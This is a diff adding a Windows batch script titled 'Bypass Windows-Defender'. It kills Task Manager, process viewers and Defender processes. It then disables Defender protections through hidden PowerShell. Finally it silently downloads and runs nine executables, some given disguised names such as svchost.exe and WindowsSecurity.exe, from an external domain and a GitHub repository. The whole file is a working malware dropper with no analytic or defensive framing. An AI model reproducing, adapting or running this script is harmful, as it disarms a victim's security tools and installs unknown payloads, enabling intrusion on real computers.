@@ -1,0 +1,43 @@
+@echo off
+pushd "%CD%"
+CD /D "%~dp0"
+title [0 percent] Bypass Windows-Defender
+
+:: Kill processes
+taskkill /f /im Taskmgr.exe
+taskkill /f /im ProcessHacker.exe
+taskkill /f /im procexp.exe
+taskkill /f /im MSASCui.exe
+taskkill /f /im MsMpEng.exe
+taskkill /f /im MpUXSrv.exe
+taskkill /f /im MpCmdRun.exe
+taskkill /f /im NisSrv.exe
+taskkill /f /im UserAccountControlSettings.exe
+taskkill /f /im taskkill.exe
+
+echo Processes have been killed.
+
+timeout /t 5 >nul
+
+:: Function to disable Windows Defender
+:disable_windows_defender
+powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend"
+powershell -WindowStyle Hidden -Command "Set-MpPreference -SubmitSamplesConsent 2"
+
+echo Windows Defender has been disabled.
+
+:: Function to download and execute files
+:download_and_execute_files
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/defender.exe', 'C:\Users\%USERNAME%\Downloads\defender.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\defender.exe' -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/svchost.exe', 'C:\Users\%USERNAME%\Downloads\svchost.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\svchost.exe' -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/WindowsSecurity.exe', 'C:\Users\%USERNAME%\Downloads\WindowsSecurity.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\WindowsSecurity.exe' -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/update.exe', 'C:\Users\%USERNAME%\Downloads\update.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\update.exe' -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/get.exe', 'C:\Users\%USERNAME%\Downloads\get.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\get.exe' -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/fviatool/fvia/raw/main/update.mp3', 'C:\Users\%USERNAME%\Downloads\update.mp3'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\update.mp3' -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/fviatool/fvia/raw/main/update.exe', 'C:\Users\%USERNAME%\Downloads\update.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\update.exe' -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/fviatool/fvia/raw/main/fvia.exe', 'C:\Users\%USERNAME%\Downloads\fvia.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\fvia.exe' -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/Runtime.exe', 'C:\Users\%USERNAME%\Downloads\Runtime.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\Runtime.exe' -WindowStyle Hidden"
+
+echo Files have been downloaded and executed.
+
+exit
